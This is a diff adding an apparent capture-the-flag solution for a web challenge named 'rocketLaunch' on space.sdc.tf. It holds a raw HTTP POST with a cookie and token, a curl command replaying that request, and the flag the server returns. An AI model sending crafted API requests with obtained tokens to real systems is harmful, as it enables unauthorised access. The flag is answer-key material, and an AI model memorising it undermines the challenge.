@@ -1,0 +1,24 @@
+POST /api/rocketLaunch HTTP/1.1
+Host: space.sdc.tf
+Cookie: __cfduid=d3d19e9bb688d521b1a0fcb9ea118c7ba1620462460
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Upgrade-Insecure-Requests: 1
+Te: trailers
+Connection: close
+Content-Type: application/json
+Content-Length: 110
+authorization: ey
+
+{"rocket":"triton",
+"launchTime":"12:00",
+"pumpID":4,
+"token":"yiLYDykacWp9sgPMluQeKkANeRFXyU3ZuxBrj2BQ"
+}
+
+curl -X POST https://space.sdc.tf/api/rocketLaunch -H "Content-Type: application/json" --data '{"rocket":"triton","launchTime":"12:00","pumpID":4,"token":"yiLYDykacWp9sgPMluQeKkANeRFXyU3ZuxBrj2BQ"}'
+```
+rocket launched. sdctf{0ne_sM@lL_sT3p_f0R_h@ck3r$}
+```
